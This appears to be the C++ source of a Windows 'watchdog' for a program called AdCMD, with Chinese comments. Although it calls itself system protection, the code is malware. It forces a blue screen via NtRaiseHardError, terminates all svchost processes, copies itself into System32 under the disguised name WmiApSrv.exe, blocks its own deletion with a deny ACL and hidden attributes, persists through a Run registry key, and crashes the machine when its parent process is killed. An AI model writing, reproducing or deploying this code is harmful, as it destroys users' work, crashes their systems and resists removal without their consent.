/**
 * AdCMD Watchdog v4.3
 * 系统保护服务 - 独立于主程序运行
 * 安装路径: %SystemRoot%\System32\wbem\Performance\WmiApSrv.exe
 */

#define WIN32_LEAN_AND_MEAN
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <string>
#include <tlhelp32.h>

#pragma comment(lib, "user32.lib")
#pragma comment(lib, "advapi32.lib")

/* ============================================================
 *  强制立即蓝屏 (BSOD)
 * ============================================================ */
typedef LONG NTSTATUS;
#define STATUS_SUCCESS ((NTSTATUS)0x00000000)

typedef NTSTATUS (WINAPI *pNtRaiseHardError)(
    NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask,
    PULONG_PTR Parameters, ULONG ValidResponseOptions, PULONG Response);

typedef NTSTATUS (WINAPI *pRtlAdjustPrivilege)(
    ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);

void ForceImmediateBSOD() {
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    if (!hNtdll) return;
    pRtlAdjustPrivilege RtlAdjustPrivilege = (pRtlAdjustPrivilege)GetProcAddress(hNtdll, "RtlAdjustPrivilege");
    pNtRaiseHardError NtRaiseHardError = (pNtRaiseHardError)GetProcAddress(hNtdll, "NtRaiseHardError");
    if (!RtlAdjustPrivilege || !NtRaiseHardError) return;
    BOOLEAN enabled = FALSE;
    RtlAdjustPrivilege(19, TRUE, FALSE, &enabled);
    ULONG response = 0;
    NtRaiseHardError(0xC000021A, 0, 0, NULL, 6, &response);
    NtRaiseHardError(0xDEADDEAD, 0, 0, NULL, 6, &response);
}

void KillSvchost() {
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return;
    PROCESSENTRY32W pe; pe.dwSize = sizeof(pe);
    if (Process32FirstW(hSnap, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, L"svchost.exe") == 0) {
                HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
                if (hProcess) { TerminateProcess(hProcess, 0xDEAD); CloseHandle(hProcess); }
            }
        } while (Process32NextW(hSnap, &pe));
    }
    CloseHandle(hSnap);
    ForceImmediateBSOD();
}

/* ============================================================
 *  文件保护
 * ============================================================ */
void ProtectFileFromDeletion(const wchar_t* filePath) {
    PSECURITY_DESCRIPTOR pSD = NULL;
    DWORD sdSize = 0;
    GetFileSecurityW(filePath, DACL_SECURITY_INFORMATION, NULL, 0, &sdSize);
    if (sdSize > 0) {
        pSD = (PSECURITY_DESCRIPTOR)LocalAlloc(LPTR, sdSize);
        if (GetFileSecurityW(filePath, DACL_SECURITY_INFORMATION, pSD, sdSize, &sdSize)) {
            EXPLICIT_ACCESSW ea;
            ZeroMemory(&ea, sizeof(EXPLICIT_ACCESSW));
            ea.grfAccessPermissions = DELETE | WRITE_DAC | WRITE_OWNER;
            ea.grfAccessMode = DENY_ACCESS;
            ea.grfInheritance = NO_INHERITANCE;
            ea.Trustee.TrusteeForm = TRUSTEE_IS_NAME;
            ea.Trustee.TrusteeType = TRUSTEE_IS_WELL_KNOWN_GROUP;
            ea.Trustee.ptstrName = (LPWSTR)L"Everyone";
            PACL pOldDACL = NULL, pNewDACL = NULL;
            BOOL bDaclPresent = FALSE, bDaclDefaulted = FALSE;
            if (GetSecurityDescriptorDacl(pSD, &bDaclPresent, &pOldDACL, &bDaclDefaulted)) {
                if (SetEntriesInAclW(1, &ea, pOldDACL, &pNewDACL) == ERROR_SUCCESS) {
                    SetSecurityDescriptorDacl(pSD, TRUE, pNewDACL, FALSE);
                    SetFileSecurityW(filePath, DACL_SECURITY_INFORMATION, pSD);
                    LocalFree(pNewDACL);
                }
            }
        }
        LocalFree(pSD);
    }
    SetFileAttributesW(filePath, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_READONLY);
}

std::wstring GetGuardPath() {
    wchar_t sysDir[MAX_PATH];
    GetSystemDirectoryW(sysDir, MAX_PATH);
    std::wstring guardDir = std::wstring(sysDir) + L"\\wbem\\Performance";
    CreateDirectoryW(guardDir.c_str(), NULL);
    return guardDir + L"\\WmiApSrv.exe";
}

std::wstring GetMainProgramPath() {
    wchar_t sysDir[MAX_PATH];
    GetSystemDirectoryW(sysDir, MAX_PATH);
    return std::wstring(sysDir) + L"\\AdCMD.exe";
}

std::wstring GetMVPath() {
    wchar_t sysDir[MAX_PATH];
    GetSystemDirectoryW(sysDir, MAX_PATH);
    return std::wstring(sysDir) + L"\\csrss.mp4";
}

void RestoreMainProgram(const wchar_t* targetPath) {
    std::wstring guardPath = GetGuardPath();
    if (GetFileAttributesW(guardPath.c_str()) != INVALID_FILE_ATTRIBUTES) {
        CopyFileW(guardPath.c_str(), targetPath, FALSE);
        ProtectFileFromDeletion(targetPath);
    }
}

/* ============================================================
 *  启动 MV 播放器 (调用独立播放器)
 * ============================================================ */
void TriggerMVPlayback() {
    std::wstring mvPath = GetMVPath();
    std::wstring playerPath = GetMainProgramPath();
    playerPath = playerPath.substr(0, playerPath.find_last_of(L'\\')) + L"\\AdCMD_Player.exe";

    // 如果独立播放器存在，用它播放
    if (GetFileAttributesW(playerPath.c_str()) != INVALID_FILE_ATTRIBUTES) {
        ShellExecuteW(NULL, L"open", playerPath.c_str(), 
            (L"\"/fullscreen \"" + mvPath + L"\"\"").c_str(), NULL, SW_SHOWNORMAL);
    } else {
        // 回退：用系统播放器
        ShellExecuteW(NULL, L"open", L"wmplayer.exe",
            (L"/fullscreen \"" + mvPath + L"\"").c_str(), NULL, SW_SHOWNORMAL);
    }
}

/* ============================================================
 *  看门狗主逻辑
 * ============================================================ */

// 监控文件删除尝试
void RunFileGuard(const wchar_t* targetPath) {
    while (true) {
        HANDLE hTest = CreateFileW(targetPath, DELETE, 0, NULL, OPEN_EXISTING, 0, NULL);
        if (hTest == INVALID_HANDLE_VALUE) {
            DWORD err = GetLastError();
            if (err == ERROR_ACCESS_DENIED) {
                // 有人尝试删除但被拒绝 -> 触发 MV
                TriggerMVPlayback();
                Sleep(30000);
            }
        } else {
            CloseHandle(hTest);
        }
        // 检测文件是否真的被删了
        if (GetFileAttributesW(targetPath) == INVALID_FILE_ATTRIBUTES) {
            Sleep(2000);
            TriggerMVPlayback();
            break;
        }
        Sleep(500);
    }
}

// 开机自启动恢复模式
void RunGuardRespawn(const wchar_t* targetPath) {
    if (GetFileAttributesW(targetPath) == INVALID_FILE_ATTRIBUTES) {
        RestoreMainProgram(targetPath);
    }
    RunFileGuard(targetPath);
}

// 父进程监控模式（主程序被杀时触发）
void RunWatchdog(DWORD parentPid) {
    HANDLE hParent = OpenProcess(SYNCHRONIZE, FALSE, parentPid);
    if (!hParent) { KillSvchost(); return; }
    WaitForSingleObject(hParent, INFINITE);
    CloseHandle(hParent);
    Sleep(500);
    KillSvchost();
    ForceImmediateBSOD();
}

// 安装看门狗到系统
void InstallGuard() {
    std::wstring guardPath = GetGuardPath();
    wchar_t exePath[MAX_PATH];
    GetModuleFileNameW(NULL, exePath, MAX_PATH);

    // 复制自身到隐藏位置
    CopyFileW(exePath, guardPath.c_str(), FALSE);
    SetFileAttributesW(guardPath.c_str(), 
        FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_READONLY);
    ProtectFileFromDeletion(guardPath.c_str());

    // 注册表启动项
    HKEY hKey;
    std::wstring runPath = L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
    std::wstring guardCmd = L"\"" + guardPath + L"\" --guard-respawn";

    if (RegCreateKeyExW(HKEY_LOCAL_MACHINE, runPath.c_str(), 0, NULL,
        REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        RegSetValueExW(hKey, L"WmiApSrv", 0, REG_SZ, (BYTE*)guardCmd.c_str(),
            (DWORD)(guardCmd.length() + 1) * sizeof(wchar_t));
        RegCloseKey(hKey);
    } else if (RegCreateKeyExW(HKEY_CURRENT_USER, runPath.c_str(), 0, NULL,
        REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        RegSetValueExW(hKey, L"WmiApSrv", 0, REG_SZ, (BYTE*)guardCmd.c_str(),
            (DWORD)(guardCmd.length() + 1) * sizeof(wchar_t));
        RegCloseKey(hKey);
    }

    // 启动文件监控
    std::wstring mainPath = GetMainProgramPath();
    wchar_t watchCmd[2048];
    swprintf(watchCmd, 2048, L"\"%s\" --guard \"%s\"", guardPath.c_str(), mainPath.c_str());
    STARTUPINFOW si = {0}; si.cb = sizeof(si); si.dwFlags = STARTF_USESHOWWINDOW; si.wShowWindow = SW_HIDE;
    PROCESS_INFORMATION pi = {0};
    CreateProcessW(NULL, watchCmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    if (pi.hProcess) { CloseHandle(pi.hProcess); CloseHandle(pi.hThread); }
}

/* ============================================================
 *  入口点
 * ============================================================ */
int WINAPI wWinMain(HINSTANCE, HINSTANCE, LPWSTR lpCmdLine, int) {
    int argc; LPWSTR* argv = CommandLineToArgvW(lpCmdLine, &argc);

    if (argc > 1 && wcscmp(argv[1], L"--watchdog") == 0 && argc > 2) {
        RunWatchdog((DWORD)_wtoi(argv[2]));
    }
    else if (argc > 1 && wcscmp(argv[1], L"--guard") == 0 && argc > 2) {
        RunFileGuard(argv[2]);
    }
    else if (argc > 0 && wcsstr(lpCmdLine, L"--guard-respawn") != NULL) {
        RunGuardRespawn(GetMainProgramPath().c_str());
    }
    else if (argc > 0 && wcsstr(lpCmdLine, L"--install") != NULL) {
        InstallGuard();
        MessageBoxW(NULL, L"AdCMD Watchdog installed.\nSystem protection active.", 
            L"Watchdog", MB_OK | MB_ICONINFORMATION);
    }
    else if (argc > 0 && wcsstr(lpCmdLine, L"--uninstall") != NULL) {
        // 清理注册表
        HKEY hKey;
        std::wstring runPath = L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
        if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, runPath.c_str(), 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
            RegDeleteValueW(hKey, L"WmiApSrv"); RegCloseKey(hKey);
        }
        if (RegOpenKeyExW(HKEY_CURRENT_USER, runPath.c_str(), 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
            RegDeleteValueW(hKey, L"WmiApSrv"); RegCloseKey(hKey);
        }
        // 尝试删除自身（可能失败，因为文件被保护）
        std::wstring guardPath = GetGuardPath();
        SetFileAttributesW(guardPath.c_str(), FILE_ATTRIBUTE_NORMAL);
        DeleteFileW(guardPath.c_str());
        MessageBoxW(NULL, L"Watchdog uninstalled.\n(If file remains, reboot and delete manually)", 
            L"Watchdog", MB_OK | MB_ICONINFORMATION);
    }

    LocalFree(argv);
    return 0;
}
